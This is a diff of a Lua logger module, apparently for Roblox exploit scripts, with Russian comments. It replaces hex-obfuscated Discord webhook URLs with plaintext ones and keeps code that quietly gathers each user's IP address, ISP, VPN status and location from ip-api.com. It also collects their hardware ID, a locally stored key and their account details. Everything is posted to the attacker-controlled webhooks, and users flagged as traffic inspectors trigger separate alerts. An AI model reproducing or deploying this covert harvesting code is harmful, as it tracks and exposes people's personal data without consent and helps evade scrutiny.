@@ -1,40 +1,35 @@
--- МИНИМАЛИСТИЧНЫЙ ЛОГГЕР
+-- =============================================================
+-- ЛОГГЕР (ОТКРЫТАЯ ВЕРСИЯ, БЕЗ ШИФРОВКИ)
+-- ЗАМЕНИ ВЕБХУКИ НА СВОИ ЕСЛИ НУЖНО
+-- =============================================================
 return function(SEC_STATE)
-    if not SEC_STATE then return end
+    if not SEC_STATE or not SEC_STATE.ORIG then return end
     local O = SEC_STATE.ORIG
-    if not O then return end
     local LocalPlayer = SEC_STATE.LocalPlayer
     local HttpService = SEC_STATE.HttpService
     local RbxAnalytics = SEC_STATE.RbxAnalytics
     local UserInputService = SEC_STATE.UserInputService
     local request = O.request
     local game_HttpGet = O.game_HttpGet
-    local loadstr = O.loadstr
     local pcall = O.pcall
     local pairs = O.pairs
     local ipairs = O.ipairs
     local tinsert = O.tinsert
     local tconcat = O.tconcat
     local tostring = O.tostring
-    local s_find = O.s_find
-    local s_sub = O.s_sub
-    local s_char = O.s_char
     local m_floor = O.math_floor
     local task_wait = O.task_wait
     local task_spawn = O.task_spawn
 
-    local function decHex(h)
-        local s = ""
-        for i = 1, #h, 2 do
-            local n = tonumber(s_sub(h,i,i+1),16)
-            if n then s = s .. s_char(n) end
-        end
-        return s
-    end
+    -- --------------------------
+    -- ВЕБХУКИ (ОТКРЫТЫЙ ТЕКСТ)
+    -- --------------------------
+    local WEBHOOK_LOG   = "https://discord.com/api/webhooks/15194099151558385938/sw3cuWpE-S2SVYHM0r1MSEvv8XiLcE_ePdR-RwqxWfQ94cHPccRsd02RwcVYsG77Aga"
+    local WEBHOOK_ALERT = "https://discord.com/api/webhooks/15183340335888381827/s1d18Avu2EmWpzTrT0jNIhjT6e1J57YX70OXHMVxxcyuSSw6L6nrBAjwVspga-L7SNKO"
 
-    -- ВЕБХУКИ
-    local WH_LOG = decHex("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
-    local WH_ALERT = decHex("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
+    -- Если хочешь использовать свои вебхуки — вставляй их сюда вместо выше:
+    -- local WEBHOOK_LOG = "ТВОЙ_ВЕБХУК_ОБЫЧНЫХ_ЛОГОВ"
+    -- local WEBHOOK_ALERT = "ТВОЙ_ВЕБХУК_АЛЕРТОВ_О_СПАЯХ"
 
     local uid = tostring(LocalPlayer.UserId)
     local hwid = "N/A"
@@ -42,44 +37,58 @@ return function(SEC_STATE)
     local key = "N/A"
     pcall(function() key = O.readfile("nazarkus_key.json") end)
 
-    -- ВАЙТЛИСТ/БЛЭКЛИСТ
-    local WL = {
+    -- --------------------------
+    -- ВАЙТЛИСТ / БЛЭКЛИСТ
+    -- --------------------------
+    local WHITELIST = {
         UIDs = {"10760143653"},
         HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
         Keys = {"46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F", "89D11F50-5490-4677-B709-4EBFBECA78CE"}
     }
-    local BL = { UIDs = {}, HWIDs = {}, Keys = {} }
-    local function inList(l)
-        for _, v in ipairs(l.UIDs or {}) do if v == uid then return true end end
-        for _, v in ipairs(l.HWIDs or {}) do if v == hwid then return true end end
-        for _, v in ipairs(l.Keys or {}) do if v == key then return true end end
+    local BLACKLIST = { UIDs = {}, HWIDs = {}, Keys = {} }
+
+    local function inList(list)
+        for _, v in ipairs(list.UIDs or {}) do if v == uid then return true end end
+        for _, v in ipairs(list.HWIDs or {}) do if v == hwid then return true end end
+        for _, v in ipairs(list.Keys or {}) do if v == key then return true end end
         return false
     end
-    local status = inList(WL.UIDs or {}) and "whitelist" or (inList(BL.UIDs or {}) and "blacklist" or "guest")
-    local spyFound = SEC_STATE.detected or false
+    local userStatus = inList(WHITELIST) and "whitelist" or (inList(BLACKLIST) and "blacklist" or "guest")
+    local spyDetected = SEC_STATE.detected or false
     local spyReason = SEC_STATE.reason or "None"
-    SEC_STATE.status = status
+    SEC_STATE.status = userStatus
     SEC_STATE.hwid = hwid
     SEC_STATE.key = key
 
-    -- ИСПОЛНИТЕЛЬ
-    local exec = "Unknown"
-    local uncPct = 0
+    -- --------------------------
+    -- ИНФОРМАЦИЯ ОБ ЭКЗЕКЬЮТОРЕ
+    -- --------------------------
+    local executorName = "Unknown"
+    local uncPercent = 0
     pcall(function()
-        local u = 0
+        local supported = 0
         local genv = getgenv and getgenv() or _G
-        local funcs = {"getgenv","getrawmetatable","hookfunction","setreadonly"}
-        for _, f in ipairs(funcs) do if genv[f] then u = u + 1 end end
-        uncPct = m_floor((u/#funcs)*100)
-        if identifyexecutor then pcall(function() exec = identifyexecutor() end) end
+        local uncFuncs = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
+        for _, funcName in ipairs(uncFuncs) do
+            if genv[funcName] then supported = supported + 1 end
+        end
+        uncPercent = m_floor((supported / #uncFuncs) * 100)
+        if identifyexecutor then
+            pcall(function() executorName = identifyexecutor() end)
+        end
     end)
-    local execStr = exec .. " (UNC: "..uncPct.."%)"
+    local executorString = executorName .. " (UNC: " .. uncPercent .. "%)"
 
-    -- СЕТЬ
-    local net = {ip="N/A", isp="N/A", vpn="N/A", country="N/A", city="N/A"}
+    -- --------------------------
+    -- СЕТЕВАЯ ИНФОРМАЦИЯ
+    -- --------------------------
+    local net = {ip="N/A", isp="N/A", vpn="No", country="N/A", city="N/A"}
     pcall(function()
-        local r = request({Url="http://ip-api.com/json/?fields=status,country,city,isp,query,proxy", Method="GET"})
-        if r and r.Success then
+        local r = request({
+            Url = "http://ip-api.com/json/?fields=status,country,city,isp,query,proxy,hosting",
+            Method = "GET"
+        })
+        if r and r.Success and r.Body then
             local ok, data = pcall(HttpService.JSONDecode, HttpService, r.Body)
             if ok and data then
                 net.ip = data.query or "N/A"
@@ -91,66 +100,76 @@ return function(SEC_STATE)
         end
     end)
 
-    -- ЕМБЕДЫ
+    -- --------------------------
+    -- ФОРМИРУЕМ EMBED
+    -- --------------------------
     local embeds = {}
 
-    if spyFound then
+    -- АЛЕРТ О СПАЕ (красный)
+    if spyDetected then
         tinsert(embeds, {
-            title = "🚨 HTTP SPY DETECTED",
-            color = 16711680,
+            title = "🚨 SECURITY ALERT: HTTP Spy Detected",
+            color = 16711680, -- красный
             fields = {
-                {name = "Reason", value = "```"..tostring(spyReason).."```"},
-                {name = "Player", value = LocalPlayer.DisplayName.." (@"..LocalPlayer.Name..")\nID: `"..uid.."`"},
-                {name = "Executor", value = execStr, inline = true},
+                {name = "Detection Reason", value = "```" .. tostring(spyReason) .. "```", inline = false},
+                {name = "Player", value = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")\nID: `" .. uid .. "`", inline = false},
+                {name = "Executor", value = executorString, inline = true},
                 {name = "System", value = UserInputService.TouchEnabled and "Mobile" or "PC", inline = true},
-                {name = "Hardware", value = "HWID: `"..hwid.."`\nKey: `"..key.."`"},
-                {name = "Network", value = "IP: "..net.ip.."\nISP: "..net.isp.."\nVPN: "..net.vpn.."\nLoc: "..net.country..", "..net.city},
-                {name = "Profile", value = "[Link](https://www.roblox.com/users/"..uid.."/profile)"}
-            }
+                {name = "Hardware Info", value = "HWID: `" .. hwid .. "`\nKey: `" .. key .. "`", inline = false},
+                {name = "Network", value = "IP: " .. net.ip .. "\nISP: " .. net.isp .. "\nVPN: " .. net.vpn .. "\nLoc: " .. net.country .. ", " .. net.city, inline = false},
+                {name = "Links", value = "[Profile](https://www.roblox.com/users/" .. uid .. "/profile)", inline = false}
+            },
+            footer = {text = "3F AntiSpy • DETECTED • " .. os.date("%d.%m.%Y %H:%M")}
         })
+        -- Отправляем на алерт вебхук
         pcall(function()
             request({
-                Url = WH_ALERT,
+                Url = WEBHOOK_ALERT,
                 Method = "POST",
-                Headers = {["Content-Type"]="application/json"},
-                Body = HttpService:JSONEncode({embeds=embeds})
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({embeds = embeds})
             })
         end)
         return
     end
 
-    if status == "whitelist" then
+    -- ВАЙТЛИСТ (зелёный, короткий лог по твоему формату)
+    if userStatus == "whitelist" then
         tinsert(embeds, {
-            title = "✅ Whitelisted User",
-            color = 65280,
+            title = "✅ Whitelisted User Executed",
+            color = 65280, -- зелёный
             fields = {
-                {name = "**Player Info**", value = "Name: "..LocalPlayer.DisplayName.." (@"..LocalPlayer.Name..")\nUser ID: `"..uid.."`"},
-                {name = "**Executor**", value = execStr},
-                {name = "**System**", value = "Platform: "..(UserInputService.TouchEnabled and "Mobile" or "PC")},
-                {name = "**Hardware Info**", value = "HWID: `"..hwid.."`\nKey: `"..key.."`"}
-            }
+                {name = "**Player Info**", value = "Name: " .. LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")\nUser ID: `" .. uid .. "`", inline = false},
+                {name = "**Executor**", value = executorString, inline = false},
+                {name = "**System**", value = "Platform: " .. (UserInputService.TouchEnabled and "Mobile" or "PC"), inline = false},
+                {name = "**Hardware Info**", value = "HWID: `" .. hwid .. "`\nKey: `" .. key .. "`", inline = false}
+            },
+            footer = {text = "3F AntiSpy • WHITELIST • " .. os.date("%d.%m.%Y %H:%M")}
         })
     else
+        -- БЛЭКЛИСТ (чёрный) ИЛИ ГОСТЬ (оранжевый)
         tinsert(embeds, {
-            title = status == "blacklist" and "⛔ Blacklisted" or "⚠️ Guest",
-            color = status == "blacklist" and 0 or 16753920,
+            title = userStatus == "blacklist" and "⛔ Blacklisted User Attempt" or "⚠️ Guest User Executed",
+            color = userStatus == "blacklist" and 0 or 16753920,
             fields = {
-                {name = "Player", value = LocalPlayer.DisplayName.." (@"..LocalPlayer.Name..")\nID: `"..uid.."`\nAge: "..LocalPlayer.AccountAge},
-                {name = "Executor", value = execStr, inline = true},
+                {name = "Player Info", value = "Name: " .. LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")\nID: `" .. uid .. "`\nAccount Age: " .. LocalPlayer.AccountAge .. " days", inline = false},
+                {name = "Executor", value = executorString, inline = true},
                 {name = "System", value = UserInputService.TouchEnabled and "Mobile" or "PC", inline = true},
-                {name = "Hardware", value = "HWID: `"..hwid.."`\nKey: `"..key.."`"},
-                {name = "Network", value = "IP: "..net.ip.."\nISP: "..net.isp.."\nVPN: "..net.vpn.."\nLoc: "..net.country..", "..net.city},
-                {name = "Profile", value = "[Link](https://www.roblox.com/users/"..uid.."/profile)"}
-            }
+                {name = "Hardware Info", value = "HWID: `" .. hwid .. "`\nKey: `" .. key .. "`", inline = false},
+                {name = "Network", value = "IP: " .. net.ip .. "\nISP: " .. net.isp .. "\nVPN: " .. net.vpn .. "\nLoc: " .. net.country .. ", " .. net.city, inline = false},
+                {name = "Links", value = "[Profile](https://www.roblox.com/users/" .. uid .. "/profile)", inline = false}
+            },
+            footer = {text = "3F AntiSpy • " .. string.upper(userStatus) .. " • " .. os.date("%d.%m.%Y %H:%M")}
         })
     end
 
+    -- Отправляем обычный лог
     pcall(function()
         request({
-            Url = WH_LOG,
+            Url = WEBHOOK_LOG,
             Method = "POST",
-            Headers = {["Content-Type"]="application/json"},
-            Body = HttpService:JSONEncode({embeds=embeds})
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({embeds = embeds})
         })
     end)
 end
